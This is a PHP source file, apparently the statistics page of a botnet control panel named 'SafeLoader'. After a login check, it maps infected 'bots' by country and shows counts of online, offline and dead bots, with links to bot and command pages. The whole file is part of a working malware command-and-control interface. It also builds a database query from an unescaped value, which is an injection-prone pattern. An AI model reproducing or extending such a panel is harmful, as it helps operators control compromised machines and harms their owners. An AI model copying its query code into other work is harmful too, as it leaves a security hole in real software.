<?php
@session_start();

    if (!isset($_SESSION['login'])) {
        header('Location: index.php');
        exit();
    }
	
    include_once('includes/config.php');
	include_once('includes/stats.php');
	include_once('includes/update_bots.php');
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>SafeLoader - Stats</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" type="text/css" href="css/main.css" />
		
		<script type='text/javascript' src='https://www.google.com/jsapi'></script>
        <script type='text/javascript'>
            google.load('visualization', '1', {'packages': ['geochart']});
            google.setOnLoadCallback(drawRegionsMap);

            function drawRegionsMap() {
                var data = google.visualization.arrayToDataTable([
                    ['Country', 'Popularity'],
<?php
    $result = mysql_query("SELECT DISTINCT country FROM bots");
    while($row = mysql_fetch_array($result)) {
        $a = $row['country'];
		echo '                    [\'' . $row['country'] . '\',';
		
        $result2 = mysql_query("SELECT * FROM bots WHERE country='$a'");
        echo mysql_num_rows($result2) . '],' . PHP_EOL;
    }
?>
                    ]);

                    var options = {
                        sizeAxis: { minValue: 0, maxValue: 100 },
						backgroundColor: {stroke: 'white' },
						backgroundColor: {strokeWidth: 2 },
                        colorAxis: {colors: ['grey', 'blue']} // orange to blue
                    };

                    var chart = new google.visualization.GeoChart(document.getElementById('chart_country'));
                    chart.draw(data, options);
            };
        </script>
    </head>
    <body>
        <aside>
            <h1><font style="text-shadow: 2px -2px 3px #2580A2, -2px -2px 3px #2580A2, -2px 2px 3px #2580A2, 2px 2px 3px #2580A2;">SafeLoader</font></h1>
            <nav>
                <ul>
                    <li class='first'>
                        <a class='active' href='stats.php'>Stats</a>
                    </li>
                    <li>
                        <a href='bots.php'>Bots</a>
                    </li>
                    <li>
                        <a href='commands.php'>Commands</a>
                    </li>
					<li>
                        <a href='includes/logout.php'>Logout</a>
                    </li>
                </ul>
           </nav>
		   <ul>
<?php
    echo '             <li class="title">General Statistics</li>' . PHP_EOL;
    echo '		       <li>Online Bots: ' . $onlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Offline Bots: ' . $offlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Dead Bots: ' . $deadcount . '</li>' . PHP_EOL;
    echo '			   <li>---------------------------------------------------</li>' . PHP_EOL;
    echo '			   <li>Total Bots: ' . $statustotal . '</li>' . PHP_EOL;
?>
		   </ul>
        </aside>
        <section class="stats">
            <article>
			    <center>
                    <div id="chart_country" style="width: auto; height: 400px;"></div>
				</center>
            </article>
        </section>
    </body>
</html>